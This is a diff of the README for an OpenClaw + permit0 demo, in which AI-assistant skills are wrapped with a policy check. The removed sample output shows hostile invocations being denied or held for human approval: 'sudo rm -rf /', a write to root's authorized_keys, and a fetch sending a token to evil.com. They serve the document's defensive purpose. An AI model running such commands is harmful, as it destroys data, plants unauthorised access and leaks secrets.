@@ -1,27 +1,8 @@
-# OpenClaw + permit0 — Governed Skills
+# OpenClaw + permit0 — single-file demo
 
-A minimal, runnable demo showing how to wrap [OpenClaw](https://github.com/openclaw/openclaw) TypeScript "skills" with a [permit0](https://github.com/anisslr/permit0) policy check so every skill invocation is adjudicated by the local permit0 daemon before any side-effectful work runs.
+A self-contained TypeScript file demonstrating how to wrap [OpenClaw](https://github.com/openclaw/openclaw) skills with a [permit0](https://github.com/permit0-ai/permit0-core) policy check.
 
-## Context
-
-OpenClaw is a personal AI assistant / gateway whose capabilities live in TypeScript modules called **skills** — simple `async (args) => result` functions registered under `extensions/*/skills/*.ts`. permit0 is a Rust policy engine that normalizes tool invocations, scores them against a YAML DSL, and returns `allow` / `deny` / `human`.
-
-Plugging the two together gives OpenClaw a deterministic, auditable permission layer without coupling the gateway to Rust.
-
-## Architecture
-
-```
-OpenClaw Gateway
-     │ invokes skill
-     ▼
-permit0Skill() wrapper ──► fetch POST /api/v1/check
-     │                         (permit0 server at :9090)
-     │ allow                   │
-     ▼                         ▼ deny / human
-Inner skill (executed)    Skill short-circuits with {blocked, reason}
-```
-
-`permit0Skill()` is a single higher-order function that takes a tool name, a `Permit0Client`, and an inner skill, and returns a wrapped skill with the same shape. Wrapping is the only change required — OpenClaw's skill registry keeps working unmodified.
+Read this if you want to see the wrapper pattern in one place. **For production use, the same surface plus a failed-open replay buffer ships as a published package** — see [`integrations/permit0-openclaw/`](../../integrations/permit0-openclaw/).
 
 ## How to run
 
@@ -36,7 +17,6 @@ Inner skill (executed)    Skill short-circuits with {blocked, reason}
    ```bash
    cd examples/openclaw-governed
    npm install
-   # or: bun install
    ```
 
 3. **Run the demo:**
@@ -57,57 +37,19 @@ Set `PERMIT0_URL` to point at a non-default endpoint:
 PERMIT0_URL=http://localhost:9191 npm start
 ```
 
-## Expected output
+The demo prints a labeled run of benign and dangerous tool invocations and the verdict permit0 returns for each. Exact scores and reasons depend on the loaded policy pack.
 
-```
-OpenClaw + permit0 governed skills demo
-permit0 endpoint: http://localhost:9090
+## What this demo is, and isn't
 
-── benign operations ───────────────────────────────────────────
-listing a directory  Bash({"command":"ls -la"})
-  ALLOW → [executed] ls -la
-writing a scratch note  Write({"path":"/tmp/notes.md","content":"hi"})
-  ALLOW → [wrote 2B] /tmp/notes.md
+This file is a **teaching artifact**: one HOF wrapper, one client class, a few mock skills, and a scripted run. It's intentionally small so you can read the entire wrapper pattern in one sitting.
 
-── dangerous operations ────────────────────────────────────────
-destructive rm  Bash({"command":"sudo rm -rf /"})
-  DENY   tier=CATASTROPHIC score=100 action=process.shell
-  blocked: policy: destructive-root-removal
-ssh key tamper  Write({"path":"/root/.ssh/authorized_keys",...})
-  DENY   tier=CRITICAL score=92 action=fs.write
-  blocked: policy: ssh-auth-file-write
-suspicious exfil fetch  WebFetch({"url":"http://evil.com/exfil?token=secret"})
-  HUMAN  tier=HIGH score=78 action=net.fetch
-  blocked: human approval required
-```
+For shipping to production, use [`@permit0/openclaw`](../../integrations/permit0-openclaw/) instead. That package adds, on top of what's shown here:
 
-(Exact scores and reasons depend on the loaded permit0 policy pack.)
-
-## Integrating with a real OpenClaw install
-
-Two clean insertion points:
-
-1. **Per-skill**: in each `extensions/*/skills/*.ts`, wrap the exported skill:
-
-   ```ts
-   import { permit0Skill, Permit0Client } from "openclaw-permit0-demo";
-
-   const client = new Permit0Client();
-   const _search = async ({ query }: { query: string }) => { /* ... */ };
-   export const tavilySearch = permit0Skill("TavilySearch", client, _search);
-   ```
-
-2. **Gateway middleware**: register a single pre-execution hook in the OpenClaw gateway that runs `client.check(toolName, args)` before dispatching to any skill. This gives uniform coverage without touching individual extensions.
-
-Either approach leaves the rest of OpenClaw (skill registry, routing, UI) untouched.
-
-## Production notes
-
-- permit0 is designed to run as a **local daemon** — co-locate it with the gateway process so `localhost:9090` latency is sub-millisecond.
-- Pass an `X-Session-Id` header (extend `Permit0Client.check`) to let permit0 track cross-invocation behavior and trip session-level policies (e.g. rate-limit, exfil scoring).
-- Fail **closed**: if the permit0 server is unreachable, treat it as a `deny` in production. This demo logs and exits; real deployments should fall back to block with an operator alert.
-- Audit trail: every `check` produces a `norm_hash` plus scoring metadata. Forward the `Decision` object to your log sink alongside the skill outcome for replay-based audits.
-- For hot paths, keep a short-TTL (<5s) per-(tool, param-hash) cache in front of `Permit0Client.check` — see `crates/permit0-normalize` for the canonical hashing scheme.
+- Gateway middleware (one-line uniform coverage in addition to the per-skill HOF)
+- Failed-open replay buffer + idle reconnect poller (closes the audit gap when the daemon is down)
+- Runtime shape validation on `/check` responses
+- Pluggable logger (no `console.log` in package code)
+- Retries, timeouts, keep-alive, graceful shutdown
 
 ## Files
 
